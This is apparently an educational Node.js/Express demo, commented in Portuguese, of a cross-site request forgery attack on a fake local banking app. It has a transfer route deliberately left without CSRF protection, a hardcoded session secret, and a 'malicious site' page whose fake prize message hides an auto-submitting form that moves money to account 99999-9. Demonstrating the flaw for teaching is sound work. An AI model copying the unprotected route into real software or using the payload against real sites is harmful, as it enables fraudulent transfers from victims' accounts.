const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(session({
    secret: 'segredo-super-secreto',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

function verificarAutenticacao(req, res, next) {
    if (req.session.usuarioId) {
        return next();
    }
    res.status(401).send('Usuario nao autenticado. Acesse: <a href="/login">/login</a>');
}

// Rota de login
app.get('/login', (req, res) => {
    req.session.usuarioId = 1;
    req.session.usuario = {
        id: 1,
        nome: 'Joao Silva',
        conta: '12345-6'
    };
    res.send(`
        <h1>Login realizado com sucesso!</h1>
        <p>Usuario: Joao Silva (Conta: 12345-6)</p>
        <a href="/transferir">Ir para area de transferencias</a>
        <br><br>
        <a href="/site-malicioso">Acessar site malicioso (ataque)</a>
    `);
});

// Rota que exibe o formulario de transferencia
app.get('/transferir', verificarAutenticacao, (req, res) => {
    res.send(`
        <h1>Transferencia Bancaria</h1>
        <p>Usuario: ${req.session.usuario.nome}</p>
        <form action="/transferir" method="POST">
            <label>Conta destino: <input type="text" name="conta_destino" required></label><br><br>
            <label>Valor (R$): <input type="number" name="valor" step="0.01" required></label><br><br>
            <button type="submit">Transferir</button>
        </form>
        <br>
        <a href="/site-malicioso">Acessar site malicioso (ataque)</a>
    `);
});

// ROTA VULNERAVEL A CSRF - SEM PROTECAO
app.post('/transferir', verificarAutenticacao, (req, res) => {
    const { conta_destino, valor } = req.body;

    console.log('TRANSFERENCIA REALIZADA (SEM PROTECAO CSRF)!');
    console.log('   De: ' + req.session.usuario.conta + ' (' + req.session.usuario.nome + ')');
    console.log('   Para: ' + conta_destino);
    console.log('   Valor: R$ ' + valor);
    console.log('   ATENCAO: Nenhum token CSRF foi validado!');

    res.send(`
        <h1>Transferencia realizada com sucesso!</h1>
        <p>De: ${req.session.usuario.conta}</p>
        <p>Para: ${conta_destino}</p>
        <p>Valor: R$ ${valor}</p>
        <br>
        <a href="/transferir">Nova transferencia</a> | <a href="/logout">Sair</a>
    `);
});

// ROTA DO SITE MALICIOSO - AGORA RODANDO NO MESMO SERVIDOR
app.get('/site-malicioso', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Voce ganhou um premio!</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
                .container { background: white; padding: 40px; border-radius: 10px; max-width: 500px; margin: 0 auto; }
                h1 { color: #27ae60; }
                .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Parabens! Voce ganhou R$ 500,00!</h1>
                <p>Processando seu premio... Aguarde!</p>
                <div class="loader"></div>
            </div>

            <!-- FORMULARIO OCULTO - ATAQUE CSRF -->
            <form action="/transferir" method="POST" id="ataque">
                <input type="hidden" name="conta_destino" value="99999-9">
                <input type="hidden" name="valor" value="500.00">
            </form>

            <script>
                // Submete o formulario automaticamente
                document.getElementById('ataque').submit();
            </script>
        </body>
        </html>
    `);
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.send('Logout realizado! <a href="/login">Fazer login novamente</a>');
    });
});

app.listen(PORT, () => {
    console.log('Servidor rodando em: http://localhost:' + PORT);
    console.log('1. Acesse http://localhost:' + PORT + '/login');
    console.log('2. Depois acesse http://localhost:' + PORT + '/site-malicioso');
});